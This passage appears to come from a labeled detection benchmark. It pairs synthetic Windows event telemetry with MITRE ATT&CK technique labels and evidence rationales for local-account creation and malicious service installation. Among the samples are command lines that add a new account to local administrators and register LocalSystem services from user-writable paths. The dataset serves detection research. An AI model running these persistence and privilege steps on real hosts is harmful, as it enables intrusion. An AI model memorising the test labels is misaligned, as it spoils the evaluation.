        "fields": [
          "CommandLine",
          "Computer",
          "Image"
        ]
      },
      {
        "event_id": "evt_766b718c",
        "fields": [
          "Computer"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "Context confirms the DEV-only powershell core creates a local service account during member-server provisioning behavior through a related telemetry event.",
  "technique_ids": [
    "T1136.001"
  ],
  "technique_names": [
    "Local Account"
  ],
  "view_id": "view_9c422577"
}
```

## pair_40c58057
Family: TF_T1136_001_E; split: test
Transition: ambiguous -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "FILESVR01",
    "event_id": "evt_474b069f",
    "event_record_id": 279650006259900,
    "fields": {
      "Computer": "FILESVR01",
      "EventID": 4720,
      "SubjectLogonId": "0x7311",
      "SubjectUserName": "helpdesk",
      "TargetUserName": "backup_40c580",
      "TimeCreated": "2026-04-18T13:35:28Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-18T13:35:28Z",
    "windows_event_id": 4720
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "FILESVR01",
    "EventID": 4720,
    "SubjectLogonId": "0x7311",
    "SubjectUserName": "helpdesk",
    "TargetUserName": "backup_40c580",
    "TimeCreated": "2026-04-18T13:35:28Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1136_001_E/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_474b069f",
        "fields": [
          "SubjectUserName",
          "TargetUserName"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "The account event is compatible with both authorized backup provisioning and abuse, so the single view is ambiguous.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_8e5ff2ce"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "FILESVR01",
    "event_id": "evt_474b069f",
    "event_record_id": 279650006259900,
    "fields": {
      "Computer": "FILESVR01",
      "EventID": 4720,
      "SubjectLogonId": "0x7311",
      "SubjectUserName": "helpdesk",
      "TargetUserName": "backup_40c580",
      "TimeCreated": "2026-04-18T13:35:28Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-18T13:35:28Z",
    "windows_event_id": 4720
  },
  {
    "channel": "Security",
    "computer": "FILESVR01",
    "event_id": "evt_ad42f342",
    "event_record_id": 90018132498149,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c net localgroup administrators backup_40c580 /add",
      "Computer": "FILESVR01",
      "EventID": 4688,
      "NewProcessId": "0x7314",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x730c",
      "SubjectLogonId": "0x7311",
      "SubjectUserName": "helpdesk",
      "TargetUserName": "helpdesk",
      "TimeCreated": "2026-04-18T13:35:31Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-18T13:35:31Z",
    "windows_event_id": 4688
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "FILESVR01",
    "EventID": 4720,
    "SubjectLogonId": "0x7311",
    "SubjectUserName": "helpdesk",
    "TargetUserName": "backup_40c580",
    "TimeCreated": "2026-04-18T13:35:28Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c net localgroup administrators backup_40c580 /add",
    "Computer": "FILESVR01",
    "EventID": 4688,
    "NewProcessId": "0x7314",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x730c",
    "SubjectLogonId": "0x7311",
    "SubjectUserName": "helpdesk",
    "TargetUserName": "helpdesk",
    "TimeCreated": "2026-04-18T13:35:31Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1136_001_E/contextual",
  "evidence_refs": {
    "T1136.001": [
      {
        "event_id": "evt_474b069f",
        "fields": [
          "SubjectLogonId",
          "TargetUserName"
        ]
      },
      {
        "event_id": "evt_ad42f342",
        "fields": [
          "CommandLine",
          "SubjectLogonId"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "Immediate administrator-group addition under the account-creation logon resolves the local-account abuse interpretation.",
  "technique_ids": [
    "T1136.001"
  ],
  "technique_names": [
    "Local Account"
  ],
  "view_id": "view_687a6508"
}
```

## pair_0a1c3811
Family: TF_T1543_003_A; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_8a937623",
    "event_record_id": 40392567258288,
    "fields": {
      "Computer": "WEB01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\Users\\Public\\elm_cedar_alder_0a1c38\\service.exe",
      "ServiceName": "Update_elm_cedar_alder_0a1c38",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "WEB01",
      "SubjectLogonId": "0x56bd",
      "SubjectUserName": "SYSTEM",
      "TimeCreated": "2026-06-03T00:58:42Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-03T00:58:42Z",
    "windows_event_id": 4697
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WEB01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\Users\\Public\\elm_cedar_alder_0a1c38\\service.exe",
    "ServiceName": "Update_elm_cedar_alder_0a1c38",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "WEB01",
    "SubjectLogonId": "0x56bd",
    "SubjectUserName": "SYSTEM",
    "TimeCreated": "2026-06-03T00:58:42Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1543_003_A/single",
  "evidence_refs": {
    "T1543.003": [
      {
        "event_id": "evt_8a937623",
        "fields": [
          "ServiceAccount",
          "ServiceFileName",
          "ServiceStartType"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "Security 4697 directly records a service installation with a user-writable binary, automatic start, and a high-privilege service account.",
  "technique_ids": [
    "T1543.003"
  ],
  "technique_names": [
    "Windows Service"
  ],
  "view_id": "view_ea361e0c"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_784b220e",
    "event_record_id": 80720248629646,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\services.exe",
      "Computer": "WEB01",
      "EventID": 1,
      "Hashes": "SHA256=4370b35ef702374f630eaa7b70e157b3cc04c10561330e95c4ad47ab9c483b21",
      "Image": "C:\\Windows\\System32\\services.exe",
      "LogonGuid": "{39e929e6-6db5-836b-fe25-0eec2b092b47}",
      "LogonId": "0x56bd",
      "ParentCommandLine": "C:\\Windows\\System32\\wininit.exe",
      "ParentImage": "C:\\Windows\\System32\\wininit.exe",
      "ParentProcessGuid": "{a4bd8e8e-12ce-c6ff-57e0-cfab7974bdcc}",
      "ParentProcessId": 22200,
      "ProcessGuid": "{496a25be-e98e-b909-ec1e-57461ebb143d}",
      "ProcessId": 22208,
      "User": "SYSTEM",
      "UtcTime": "2026-06-03T00:58:39Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-03T00:58:39Z",
    "windows_event_id": 1
  },
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_8a937623",
    "event_record_id": 40392567258288,
    "fields": {
      "Computer": "WEB01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\Users\\Public\\elm_cedar_alder_0a1c38\\service.exe",
      "ServiceName": "Update_elm_cedar_alder_0a1c38",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "WEB01",
      "SubjectLogonId": "0x56bd",
      "SubjectUserName": "SYSTEM",
      "TimeCreated": "2026-06-03T00:58:42Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-03T00:58:42Z",
    "windows_event_id": 4697
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\services.exe",
    "Computer": "WEB01",
    "EventID": 1,
    "Hashes": "SHA256=4370b35ef702374f630eaa7b70e157b3cc04c10561330e95c4ad47ab9c483b21",
    "Image": "C:\\Windows\\System32\\services.exe",
    "LogonGuid": "{39e929e6-6db5-836b-fe25-0eec2b092b47}",
    "LogonId": "0x56bd",
    "ParentCommandLine": "C:\\Windows\\System32\\wininit.exe",
    "ParentImage": "C:\\Windows\\System32\\wininit.exe",
    "ParentProcessGuid": "{a4bd8e8e-12ce-c6ff-57e0-cfab7974bdcc}",
    "ParentProcessId": 22200,
    "ProcessGuid": "{496a25be-e98e-b909-ec1e-57461ebb143d}",
    "ProcessId": 22208,
    "User": "SYSTEM",
    "UtcTime": "2026-06-03T00:58:39Z"
  },
  {
    "Computer": "WEB01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\Users\\Public\\elm_cedar_alder_0a1c38\\service.exe",
    "ServiceName": "Update_elm_cedar_alder_0a1c38",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "WEB01",
    "SubjectLogonId": "0x56bd",
    "SubjectUserName": "SYSTEM",
    "TimeCreated": "2026-06-03T00:58:42Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1543_003_A/contextual",
  "evidence_refs": {
    "T1543.003": [
      {
        "event_id": "evt_8a937623",
        "fields": [
          "Computer",
          "ServiceFileName",
          "ServiceName",
          "SubjectUserName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_784b220e",
        "fields": [
          "Computer",
          "Image",
          "User",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The 4697 event records the service installation fields; a services.exe process record supplies related host and chronology context.",
  "technique_ids": [
    "T1543.003"
  ],
  "technique_names": [
    "Windows Service"
  ],
  "view_id": "view_6d3200c2"
}
```

## pair_0ad11118
Family: TF_T1543_003_B; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_75bee966",
    "event_record_id": 9736325091880,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\Windows\\System32\\cmd.exe /c \"C:\\ProgramData\\fir_birch_larch_0ad111\\agent.exe\"",
      "ServiceName": "Update_fir_birch_larch_0ad111",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "EXCH01",
      "SubjectLogonId": "0x8ad5",
      "SubjectUserName": "admin.svc",
      "TimeCreated": "2026-05-05T23:41:02Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-05T23:41:02Z",
    "windows_event_id": 4697
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "EXCH01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\Windows\\System32\\cmd.exe /c \"C:\\ProgramData\\fir_birch_larch_0ad111\\agent.exe\"",
    "ServiceName": "Update_fir_birch_larch_0ad111",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "EXCH01",
    "SubjectLogonId": "0x8ad5",
    "SubjectUserName": "admin.svc",
    "TimeCreated": "2026-05-05T23:41:02Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1543_003_B/single",
  "evidence_refs": {
    "T1543.003": [
      {
        "event_id": "evt_75bee966",
        "fields": [
          "ServiceFileName",
          "ServiceStartType"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The 4697 record stores a service image field containing a cmd.exe invocation with a ProgramData path; this is configuration evidence, not command completion.",
  "technique_ids": [
    "T1543.003"
  ],
  "technique_names": [
    "Windows Service"
  ],
  "view_id": "view_da4cd8e2"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_75bee966",
    "event_record_id": 9736325091880,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\Windows\\System32\\cmd.exe /c \"C:\\ProgramData\\fir_birch_larch_0ad111\\agent.exe\"",
      "ServiceName": "Update_fir_birch_larch_0ad111",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "EXCH01",
      "SubjectLogonId": "0x8ad5",
      "SubjectUserName": "admin.svc",
      "TimeCreated": "2026-05-05T23:41:02Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-05T23:41:02Z",
    "windows_event_id": 4697
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "EXCH01",
    "event_id": "evt_10e405fa",
    "event_record_id": 20349741010655,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c \"C:\\ProgramData\\fir_birch_larch_0ad111\\agent.exe\"",
      "Computer": "EXCH01",
      "EventID": 1,
      "Hashes": "SHA256=aff50af76ffba4b4b7b54b3f259c25ca785085d1e9e339463924d5913d1171d4",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "LogonGuid": "{61193e83-5284-56cc-e8e7-9a95f7aabd85}",
      "LogonId": "0x8ad5",
      "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
      "ParentImage": "C:\\Windows\\System32\\services.exe",
      "ParentProcessGuid": "{7ea0e84d-a7a1-a095-6779-d380703d4d26}",
      "ParentProcessId": 35536,
      "ProcessGuid": "{12820b15-8edf-8a0a-44b6-397afc7d65fb}",
      "ProcessId": 35544,
      "User": "SYSTEM",
      "UtcTime": "2026-05-05T23:41:05Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-05T23:41:05Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "EXCH01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\Windows\\System32\\cmd.exe /c \"C:\\ProgramData\\fir_birch_larch_0ad111\\agent.exe\"",
    "ServiceName": "Update_fir_birch_larch_0ad111",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "EXCH01",
    "SubjectLogonId": "0x8ad5",
    "SubjectUserName": "admin.svc",
    "TimeCreated": "2026-05-05T23:41:02Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c \"C:\\ProgramData\\fir_birch_larch_0ad111\\agent.exe\"",
    "Computer": "EXCH01",
    "EventID": 1,
    "Hashes": "SHA256=aff50af76ffba4b4b7b54b3f259c25ca785085d1e9e339463924d5913d1171d4",
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "LogonGuid": "{61193e83-5284-56cc-e8e7-9a95f7aabd85}",
    "LogonId": "0x8ad5",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentProcessGuid": "{7ea0e84d-a7a1-a095-6779-d380703d4d26}",
    "ParentProcessId": 35536,
    "ProcessGuid": "{12820b15-8edf-8a0a-44b6-397afc7d65fb}",
    "ProcessId": 35544,
    "User": "SYSTEM",
    "UtcTime": "2026-05-05T23:41:05Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1543_003_B/contextual",
  "evidence_refs": {
    "T1543.003": [
      {
        "event_id": "evt_75bee966",
        "fields": [
          "Computer",
          "ServiceFileName",
          "ServiceName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_10e405fa",
        "fields": [
          "Computer",
          "Image",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "A later process-creation event records cmd.exe with the configured service command line; the available records do not establish that the service launched it or that the command completed.",
  "technique_ids": [
    "T1543.003"
  ],
  "technique_names": [
    "Windows Service"
  ],
  "view_id": "view_53191e5c"
}
```

## pair_002a3608
Family: TF_T1543_003_D; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_907d27c7",
    "event_record_id": 64214582874504,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\Windows\\System32\\svchost.exe -k ash_beech_holly_002a36 -s Update_ash_beech_holly_002a36 ServiceDll=C:\\Users\\Public\\ash_beech_holly_002a36\\service.dll",
      "ServiceName": "Update_ash_beech_holly_002a36",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "EXCH01",
      "SubjectLogonId": "0x1855",
      "SubjectUserName": "tjones",
      "TimeCreated": "2026-04-01T14:24:53Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-01T14:24:53Z",
    "windows_event_id": 4697
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "EXCH01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\Windows\\System32\\svchost.exe -k ash_beech_holly_002a36 -s Update_ash_beech_holly_002a36 ServiceDll=C:\\Users\\Public\\ash_beech_holly_002a36\\service.dll",
    "ServiceName": "Update_ash_beech_holly_002a36",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "EXCH01",
    "SubjectLogonId": "0x1855",
    "SubjectUserName": "tjones",
    "TimeCreated": "2026-04-01T14:24:53Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1543_003_D/single",
  "evidence_refs": {
    "T1543.003": [
      {
        "event_id": "evt_907d27c7",
        "fields": [
          "ServiceAccount",
          "ServiceFileName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The service-install event records a LocalSystem service configuration containing a DLL path in a user-writable location; it does not show that svchost loaded the DLL.",
  "technique_ids": [
    "T1543.003"
  ],
  "technique_names": [
    "Windows Service"
  ],
  "view_id": "view_fb2f88f6"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "EXCH01",
    "event_id": "evt_9c693526",
    "event_record_id": 185632581826188,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 11,
      "Image": "C:\\Windows\\System32\\msiexec.exe",
      "ProcessGuid": "{a8d4f419-368c-e43c-6264-c7bce6abe033}",
      "ProcessId": 6232,
      "TargetFilename": "C:\\Users\\Public\\ash_beech_holly_002a36\\service.dll",
      "User": "tjones",
      "UtcTime": "2026-04-01T14:24:50Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-04-01T14:24:50Z",
    "windows_event_id": 11
  },
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_907d27c7",
    "event_record_id": 64214582874504,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\Windows\\System32\\svchost.exe -k ash_beech_holly_002a36 -s Update_ash_beech_holly_002a36 ServiceDll=C:\\Users\\Public\\ash_beech_holly_002a36\\service.dll",
      "ServiceName": "Update_ash_beech_holly_002a36",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "EXCH01",
      "SubjectLogonId": "0x1855",
      "SubjectUserName": "tjones",
      "TimeCreated": "2026-04-01T14:24:53Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-01T14:24:53Z",
    "windows_event_id": 4697
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "EXCH01",
    "EventID": 11,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "ProcessGuid": "{a8d4f419-368c-e43c-6264-c7bce6abe033}",
    "ProcessId": 6232,
    "TargetFilename": "C:\\Users\\Public\\ash_beech_holly_002a36\\service.dll",
    "User": "tjones",
    "UtcTime": "2026-04-01T14:24:50Z"
  },
  {
    "Computer": "EXCH01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\Windows\\System32\\svchost.exe -k ash_beech_holly_002a36 -s Update_ash_beech_holly_002a36 ServiceDll=C:\\Users\\Public\\ash_beech_holly_002a36\\service.dll",
    "ServiceName": "Update_ash_beech_holly_002a36",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "EXCH01",
    "SubjectLogonId": "0x1855",
    "SubjectUserName": "tjones",
    "TimeCreated": "2026-04-01T14:24:53Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1543_003_D/contextual",
  "evidence_refs": {
    "T1543.003": [
      {
        "event_id": "evt_907d27c7",
        "fields": [
          "Computer",
          "ServiceFileName"
        ]
      },
      {
        "event_id": "evt_9c693526",
        "fields": [
          "Computer",
          "TargetFilename"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The related DLL file event corroborates the installed service image path; it does not establish that svchost loaded the DLL.",
  "technique_ids": [
    "T1543.003"
  ],
  "technique_names": [
    "Windows Service"
  ],
  "view_id": "view_5d694f49"
}
```

## pair_66429f4b
Family: TF_T1543_003_DEV; split: dev
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_58194842",
    "event_record_id": 214413376977973,
    "fields": {
      "Computer": "WEB01",
      "EventID": 4697,
      "ServiceAccount": "LocalService",
      "ServiceFileName": "C:\\Windows\\System32\\svchost.exe -k willow_aspen_ash_66429f -s Update_willow_aspen_ash_66429f ServiceDll=C:\\ProgramData\\willow_aspen_ash_66429f\\service.dll",
      "ServiceName": "Update_willow_aspen_ash_66429f",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "WEB01",
      "SubjectLogonId": "0x6345",
      "SubjectUserName": "admin.svc",
      "TimeCreated": "2026-01-13T22:33:02Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-01-13T22:33:02Z",
    "windows_event_id": 4697
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WEB01",
    "EventID": 4697,
    "ServiceAccount": "LocalService",
    "ServiceFileName": "C:\\Windows\\System32\\svchost.exe -k willow_aspen_ash_66429f -s Update_willow_aspen_ash_66429f ServiceDll=C:\\ProgramData\\willow_aspen_ash_66429f\\service.dll",
    "ServiceName": "Update_willow_aspen_ash_66429f",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "WEB01",
    "SubjectLogonId": "0x6345",
    "SubjectUserName": "admin.svc",
    "TimeCreated": "2026-01-13T22:33:02Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1543_003_DEV/single",
  "evidence_refs": {
    "T1543.003": [
      {
        "event_id": "evt_58194842",
        "fields": [
          "ServiceAccount",
          "ServiceFileName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The DEV-only windows service dll hosted by svchost under localservice has concrete technique-specific evidence in its anchor event.",
  "technique_ids": [
    "T1543.003"
  ],
  "technique_names": [
    "Windows Service"
  ],
  "view_id": "view_f971ee19"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_cd85967a",
    "event_record_id": 161159013450291,
    "fields": {
      "Computer": "WEB01",
      "EventID": 11,
      "Image": "C:\\Windows\\System32\\msiexec.exe",
      "ProcessGuid": "{9292c1bf-c233-bcb0-e461-0ea12f29c756}",
      "ProcessId": 25416,
      "TargetFilename": "C:\\ProgramData\\willow_aspen_ash_66429f\\service.dll",
      "User": "admin.svc",
      "UtcTime": "2026-01-13T22:32:59Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-13T22:32:59Z",
    "windows_event_id": 11
  },
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_58194842",
    "event_record_id": 214413376977973,
    "fields": {
      "Computer": "WEB01",
      "EventID": 4697,
      "ServiceAccount": "LocalService",
      "ServiceFileName": "C:\\Windows\\System32\\svchost.exe -k willow_aspen_ash_66429f -s Update_willow_aspen_ash_66429f ServiceDll=C:\\ProgramData\\willow_aspen_ash_66429f\\service.dll",
      "ServiceName": "Update_willow_aspen_ash_66429f",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "WEB01",
      "SubjectLogonId": "0x6345",
      "SubjectUserName": "admin.svc",
      "TimeCreated": "2026-01-13T22:33:02Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-01-13T22:33:02Z",
    "windows_event_id": 4697
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "WEB01",
    "EventID": 11,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "ProcessGuid": "{9292c1bf-c233-bcb0-e461-0ea12f29c756}",
    "ProcessId": 25416,
    "TargetFilename": "C:\\ProgramData\\willow_aspen_ash_66429f\\service.dll",
    "User": "admin.svc",
    "UtcTime": "2026-01-13T22:32:59Z"
  },
  {
    "Computer": "WEB01",
    "EventID": 4697,
    "ServiceAccount": "LocalService",
    "ServiceFileName": "C:\\Windows\\System32\\svchost.exe -k willow_aspen_ash_66429f -s Update_willow_aspen_ash_66429f ServiceDll=C:\\ProgramData\\willow_aspen_ash_66429f\\service.dll",
    "ServiceName": "Update_willow_aspen_ash_66429f",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "WEB01",
    "SubjectLogonId": "0x6345",
    "SubjectUserName": "admin.svc",
    "TimeCreated": "2026-01-13T22:33:02Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1543_003_DEV/contextual",
  "evidence_refs": {
    "T1543.003": [
      {
        "event_id": "evt_58194842",
        "fields": [
          "Computer",
          "ServiceAccount",
          "ServiceFileName"
        ]
      },
      {
        "event_id": "evt_cd85967a",
        "fields": [
          "Computer"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "Context confirms the DEV-only windows service dll hosted by svchost under localservice behavior through a related telemetry event.",
  "technique_ids": [
    "T1543.003"
  ],
  "technique_names": [
    "Windows Service"
  ],
  "view_id": "view_03f93863"
}
```

## pair_243198ef
Family: TF_T1543_003_E; split: test
Transition: ambiguous -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_07f5f9a1",
    "event_record_id": 246678825601726,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\Windows\\System32\\svchost.exe -k pine_elm_holly_243198 -s Update_pine_elm_holly_243198 ServiceDll=C:\\ProgramData\\pine_elm_holly_243198\\service.dll",
      "ServiceName": "Update_pine_elm_holly_243198",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "EXCH01",
      "SubjectLogonId": "0x13241",
      "SubjectUserName": "wlee",
      "TimeCreated": "2026-03-17T17:29:35Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-03-17T17:29:35Z",
    "windows_event_id": 4697
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "EXCH01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\Windows\\System32\\svchost.exe -k pine_elm_holly_243198 -s Update_pine_elm_holly_243198 ServiceDll=C:\\ProgramData\\pine_elm_holly_243198\\service.dll",
    "ServiceName": "Update_pine_elm_holly_243198",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "EXCH01",
    "SubjectLogonId": "0x13241",
    "SubjectUserName": "wlee",
    "TimeCreated": "2026-03-17T17:29:35Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1543_003_E/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_07f5f9a1",
        "fields": [
          "ServiceFileName"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "The 4697 record configures a service image that references a DLL under ProgramData; it does not establish runtime loading or abuse.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_cd970690"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "EXCH01",
    "event_id": "evt_fd6f021e",
    "event_record_id": 220962340161371,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 11,
      "Image": "C:\\Windows\\System32\\msiexec.exe",
      "ProcessGuid": "{c8f6cdcb-475b-9096-3e5e-21edd79fc9ae}",
